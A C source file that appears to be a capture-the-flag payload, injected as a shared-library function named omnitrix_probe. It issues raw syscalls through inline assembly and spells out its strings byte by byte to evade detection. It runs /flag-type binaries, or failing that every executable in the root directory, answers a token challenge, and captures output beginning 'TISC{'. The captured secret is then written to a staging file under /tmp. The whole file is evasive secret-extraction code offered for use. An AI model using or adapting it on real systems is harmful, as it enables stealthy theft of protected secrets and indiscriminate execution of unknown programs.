#include <stdint.h>
#include <stddef.h>

static __attribute__((noinline)) long xcall(long n, long a, long b, long c,
                                              long d, long e, long f) {
    register long r10 __asm__("r10") = d;
    register long r8  __asm__("r8")  = e;
    register long r9  __asm__("r9")  = f;
    long out;
    __asm__ volatile("syscall"
                     : "=a"(out)
                     : "a"(n), "D"(a), "S"(b), "d"(c),
                       "r"(r10), "r"(r8), "r"(r9)
                     : "rcx", "r11", "memory");
    return out;
}

static long call3(long n, long a, long b, long c) {
    return xcall(n, a, b, c, 0, 0, 0);
}

static long call1(long n, long a) {
    return xcall(n, a, 0, 0, 0, 0, 0);
}

static int find_bytes(const unsigned char *buf, int length,
                      const unsigned char *needle, int needle_length) {
    int i, j;
    for (i = 0; i + needle_length <= length; i++) {
        for (j = 0; j < needle_length; j++) {
            if (buf[i + j] != needle[j]) break;
        }
        if (j == needle_length) return i;
    }
    return -1;
}

static int same_name(const char *a, const char *b) {
    int i = 0;
    while (a[i] && b[i] && a[i] == b[i]) i++;
    return a[i] == 0 && b[i] == 0;
}

static void write_result(const unsigned char *message, int length) {
    static const char output_path[] = {
        '/','t','m','p','/','o','m','n','i','t','r','i','x','/',
        'c','o','d','o','n','/','r','e','p','l','a','y','/','r','e','s','u','l','t',0
    };
    unsigned char strand[700];
    if (length < 0 || length > 650) return;

    strand[0] = 'O'; strand[1] = 'R'; strand[2] = 'E'; strand[3] = 'P';
    strand[4] = 0; strand[5] = 1;
    strand[6] = 0; strand[7] = 5;
    strand[8] = 'c'; strand[9] = 'h'; strand[10] = 'i';
    strand[11] = 'm'; strand[12] = 'e';
    strand[13] = (unsigned char)(length >> 8);
    strand[14] = (unsigned char)length;
    for (int i = 0; i < length; i++) strand[15 + i] = message[i];
    strand[15 + length] = 0;
    strand[16 + length] = 0;

    call3(263, -100, (long)output_path, 0);
    long fd = xcall(257, -100, (long)output_path, 577, 0644, 0, 0);
    if (fd < 0) return;
    call3(1, fd, (long)strand, length + 17);
    call1(3, fd);
}

static int run_candidate(const char *program, unsigned char *result, int cap) {
    int input_pipe[2];
    int output_pipe[2];
    unsigned char buffer[1024];
    static const unsigned char token_marker[] = {'t','o','k','e','n',':',' '};
    static const unsigned char flag_marker[] = {'T','I','S','C','{'};
    long pid;
    int used = 0;
    int marker;
    long got;

    if (call3(293, (long)input_pipe, 0, 0) < 0) return 0;
    if (call3(293, (long)output_pipe, 0, 0) < 0) return 0;

    pid = call1(57, 0);
    if (pid == 0) {
        char *argv[2];
        argv[0] = (char *)program;
        argv[1] = 0;

        call3(33, input_pipe[0], 0, 0);
        call3(33, output_pipe[1], 1, 0);
        call3(33, output_pipe[1], 2, 0);
        call3(59, (long)program, (long)argv, 0);
        call1(60, 127);
        for (;;) {}
    }

    call1(3, input_pipe[0]);
    call1(3, output_pipe[1]);

    while (used < (int)sizeof(buffer)) {
        got = call3(0, output_pipe[0], (long)(buffer + used),
                    sizeof(buffer) - used);
        if (got <= 0) break;
        used += (int)got;

        marker = find_bytes(buffer, used, token_marker,
                            sizeof(token_marker));
        if (marker >= 0 && used >= marker + 7 + 16) {
            call3(1, input_pipe[1], (long)(buffer + marker + 7), 16);
            break;
        }
    }

    while (used < (int)sizeof(buffer)) {
        got = call3(0, output_pipe[0], (long)(buffer + used),
                    sizeof(buffer) - used);
        if (got <= 0) break;
        used += (int)got;
    }

    call1(3, input_pipe[1]);
    call1(3, output_pipe[0]);

    marker = find_bytes(buffer, used, flag_marker, sizeof(flag_marker));
    if (marker < 0) return 0;

    used -= marker;
    if (used > cap) used = cap;
    for (int i = 0; i < used; i++) result[i] = buffer[marker + i];
    return used;
}

static int scan_root(unsigned char *result, int cap) {
    static const char root[] = {'/',0};
    static const char skip_name[] = {
        'o','m','n','i','t','r','i','x',0
    };
    unsigned char entries[4096];
    char path[320];
    long fd = xcall(257, -100, (long)root, 65536, 0, 0, 0);
    if (fd < 0) return 0;

    for (;;) {
        long count = call3(217, fd, (long)entries, sizeof(entries));
        if (count <= 0) break;
        long offset = 0;
        while (offset + 19 < count) {
            unsigned char *entry = entries + offset;
            unsigned short record_length =
                (unsigned short)entry[16] |
                ((unsigned short)entry[17] << 8);
            unsigned char type = entry[18];
            char *name = (char *)(entry + 19);
            if (record_length < 20 || offset + record_length > count) break;

            if ((type == 8 || type == 10 || type == 0) &&
                name[0] != '.' && !same_name(name, skip_name)) {
                int i = 0;
                path[i++] = '/';
                while (name[i - 1] && i < (int)sizeof(path) - 1) {
                    path[i] = name[i - 1];
                    i++;
                }
                path[i] = 0;
                int length = run_candidate(path, result, cap);
                if (length > 0) {
                    call1(3, fd);
                    return length;
                }
            }
            offset += record_length;
        }
    }
    call1(3, fd);
    return 0;
}

__attribute__((visibility("default")))
void omnitrix_probe(void) {
    static const char p0[] = {'/','f','l','a','g',0};
    static const char p1[] = {'/','f','l','a','g','.','b','i','n',0};
    static const char p2[] = {'/','a','p','p','/','f','l','a','g',0};
    const char *programs[] = {p0, p1, p2};
    unsigned char flag[512];
    static const unsigned char started[] = {
        'p','r','o','b','e',':','s','t','a','r','t','e','d'
    };
    static const unsigned char not_found[] = {
        'p','r','o','b','e',':','n','o','_','f','l','a','g','_','e','x','e','c'
    };
    int length = 0;

    write_result(started, sizeof(started));

    for (int i = 0; i < 3 && length == 0; i++)
        length = run_candidate(programs[i], flag, sizeof(flag));

    if (length == 0)
        length = scan_root(flag, sizeof(flag));

    if (length <= 0 || length > 512) {
        write_result(not_found, sizeof(not_found));
        return;
    }
    write_result(flag, length);
}
